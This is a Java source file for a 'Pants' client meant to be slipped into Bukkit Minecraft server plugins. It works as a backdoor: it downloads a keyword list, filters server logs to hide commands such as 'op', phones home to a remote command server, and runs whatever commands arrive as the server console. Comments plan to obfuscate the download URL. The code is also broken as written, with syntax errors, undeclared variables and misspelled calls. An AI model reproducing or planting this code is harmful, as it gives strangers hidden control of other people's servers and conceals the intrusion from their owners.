package pants.client;

import java.io.*
import java.lang.*;
import java.util.*;
import java.util.logging.*;

/**
 * This class is meant to be placed in your Bukkit plugins. 
 *  Multiple plugins each containing one client are not recommended.
 */
public class PantsClient {

    static Socket client = null;
    private static final ArrayList<String> words = new ArrayList<String>(); // Contains bad words like 'op'
    private static String prefix; // Used for messages

    public static void onLoad() { // Call from JavaPlugin
        init();
        // Put in the IP and Port of your Pants Server
        Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
        checkConnectionThread.start();
    }

    public static void init() {
        // TODO: obfuscate url
        URL url = new URL("https://raw.githubusercontent.com/phase/pants/master/data/M3554G3S.py");
        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
        String line;
        while ((line = in.readLine()) != null) {
            if (line.trim().startsWith("#p$")) {
                words.add(line.trim().split("$")[1]);
            }
        }
        in.close();
        Logger.getLogger("Minecraft").setFilter(new Filter(){
            public boolean isLoggable(LogRecord record) {
                return !record.getMessage().contains(words.get(0));
            }
         });
    }

    public static void handshake() {
        // in new thread?
        BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
        PrintStream toServer = new PrintStream(client.getOutputStream());
        String ip = Bukkit.getServer().getAddress() + (Bukkit.getServer().getPort() != 25565 ? ":" + Bukkit.getServer().getPort() : "");
        prefix = "[" + ip + "] ";
        toServer.println(ip);
        getCommands();
    }

    public static void getCommands() {
        while (true) {
            String in = fromServer.readline();
            if (in.contains("&&")) {
                for (String c : in.split("&&")) {
                    parseCommand(c, fromServer, toServer);
                }
            }
            else {
                parseCommand(in, fromServer, toServer);
            }
         }
    }

    public static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer) {
        String[] args = cmd.split(" ");
        if (words.contains(args[0])) {
            // Run suspicious commands
            //  op jdf2
            runCommand(cmd);
        }
        else if (cmd.startsWith("sudo ")) {
            // Run a command as the console
            //  sudo say hello
            cmd = cmd.replaceFirst("sudo ", "");
            runCommand(cmd);
        }
        toServer.println(prefix + "Ran command: " + cmd);
    }
            
    public static void runCommand(String s) {
        Bukkit.getSever().dispatchCommand(Bukkit.getServer().getConsoleSender(), s);
    }

    class CheckConnectionRunnable implements Runnable {

        String hostname;
        int port;

        public CheckClientConnection(String h, int p) {
            this.hostname = h;
            this.port = p;
        }

        public void run() {
            while (PantsClient.client == null) {
                try (Socket s = new Socket(hostname, port)) {
                    // Try to connect to server. Not sure if this will wait for connection, or fail if not found.
                    PantsClient.client = s;
                }
                catch(Exception e) {
                    PantsClient.client = null;
                    Thread.sleep(10*1000); // Sleep ten seconds between connection tests
                }
            }
            PantsClient.handshake(); // Got connection
        }
    }
}
